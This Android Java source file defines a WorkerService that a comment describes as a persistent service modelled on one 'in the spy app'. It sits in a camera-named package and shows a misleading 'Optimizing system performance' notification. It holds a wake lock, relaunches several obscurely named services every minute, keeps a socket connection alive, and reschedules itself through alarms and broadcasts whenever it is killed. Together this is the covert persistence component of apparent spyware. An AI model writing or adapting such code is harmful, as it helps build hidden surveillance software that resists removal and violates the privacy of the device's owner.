package com.android.photo.camera.capture;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;
import android.util.Log;

import java.lang.ref.WeakReference;

/**
 * Primary persistent service similar to _srv_worker_ in the spy app
 * This service continuously works to ensure other services are running
 */
public class WorkerService extends Service {
    private static final String TAG = "WorkerService";
    private PowerManager.WakeLock wakeLock;
    private Handler handler;
    private static final long CHECK_INTERVAL = 60 * 1000; // 1 minute
    private static final long RESTART_INTERVAL = 5 * 1000; // 5 seconds
    boolean isDestroyed = false; // Flag to track service destruction

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "WorkerService created");

        // Start in foreground with notification
        ForegroundServiceHelper.startForeground(this, 1003,
                "System Worker", "Optimizing system performance");

        // Create handler for periodic tasks
        handler = new Handler(Looper.getMainLooper());

        // Acquire wake lock to prevent system from sleeping
        acquireWakeLock();

        // Start monitoring services
        startMonitoring();
    }

    private void acquireWakeLock() {
        try {
            PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
            wakeLock = powerManager.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "WorkerService::WakeLockTag"
            );
            wakeLock.acquire(10 * 60 * 1000L); // 10 minutes timeout
        } catch (Exception e) {
            Log.e(TAG, "Error acquiring wake lock", e);
        }
    }

    private void startMonitoring() {
        // Start periodic check of services
        MonitoringRunnable runnable = new MonitoringRunnable(this);
        handler.postDelayed(runnable, CHECK_INTERVAL);
    }

    /** Schedules the next check if the service is still active */
    void scheduleNextCheck(Runnable runnable) {
        if (handler != null && !isDestroyed) {
            handler.postDelayed(runnable, CHECK_INTERVAL);
        }
    }

    private void checkAndStartServices() {
        if (isDestroyed) {
            Log.w(TAG, "Service is destroyed, skipping checkAndStartServices");
            return;
        }
        Log.d(TAG, "Checking services...");

        // Start all services
        startClassGen5Service();
        startClassGen6Service();
        startClassGen11Service();
        startMyWorkerService();

        // Ensure socket connection
        Connect.startAsync(getApplicationContext());
    }

    private void startClassGen5Service() {
        try {
            Intent serviceIntent = new Intent(this, ClassGen5Service.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting ClassGen5Service", e);
        }
    }

    private void startClassGen6Service() {
        try {
            Intent serviceIntent = new Intent(this, ClassGen6Service.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting ClassGen6Service", e);
        }
    }

    private void startClassGen11Service() {
        try {
            Intent serviceIntent = new Intent(this, ClassGen11Service.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting ClassGen11Service", e);
        }
    }

    private void startMyWorkerService() {
        try {
            Intent serviceIntent = new Intent(this, MyWorkerService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting MyWorkerService", e);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "WorkerService started");

        // Ensure we're running in foreground if restarted
        ForegroundServiceHelper.startForeground(this, 1003,
                "System Worker", "Optimizing system performance");

        // Run service check immediately on start command
        checkAndStartServices();

        return START_STICKY; // Restart if killed
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "WorkerService destroyed");
        isDestroyed = true; // Mark service as destroyed

        // Release wake lock if still held
        if (wakeLock != null && wakeLock.isHeld()) {
            try {
                wakeLock.release();
            } catch (Exception e) {
                Log.e(TAG, "Error releasing wake lock", e);
            }
        }

        // Remove all pending callbacks
        if (handler != null) {
            handler.removeCallbacksAndMessages(null);
        }

        // Schedule restart
        scheduleRestart();

        // Send broadcast to restart
        Intent restartIntent = new Intent("RestartSensor");
        sendBroadcast(restartIntent);
    }

    private void scheduleRestart() {
        try {
            AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            Intent intent = new Intent(this, WorkerService.class);

            PendingIntent pendingIntent = PendingIntent.getService(
                    this,
                    1001,
                    intent,
                    PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE
            );

            if (alarmManager != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    alarmManager.setExactAndAllowWhileIdle(
                            AlarmManager.ELAPSED_REALTIME_WAKEUP,
                            SystemClock.elapsedRealtime() + RESTART_INTERVAL,
                            pendingIntent
                    );
                } else {
                    alarmManager.setExact(
                            AlarmManager.ELAPSED_REALTIME_WAKEUP,
                            SystemClock.elapsedRealtime() + RESTART_INTERVAL,
                            pendingIntent
                    );
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error scheduling restart", e);
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    /** Static inner class to handle periodic monitoring */
    private static class MonitoringRunnable implements Runnable {
        private final WeakReference<WorkerService> serviceRef;

        MonitoringRunnable(WorkerService service) {
            this.serviceRef = new WeakReference<>(service);
        }

        @Override
        public void run() {
            WorkerService service = serviceRef.get();
            if (service != null && !service.isDestroyed) {
                service.checkAndStartServices();
                service.scheduleNextCheck(this);
            } else {
                Log.w(TAG, "Service is null or destroyed, skipping execution");
            }
        }
    }
}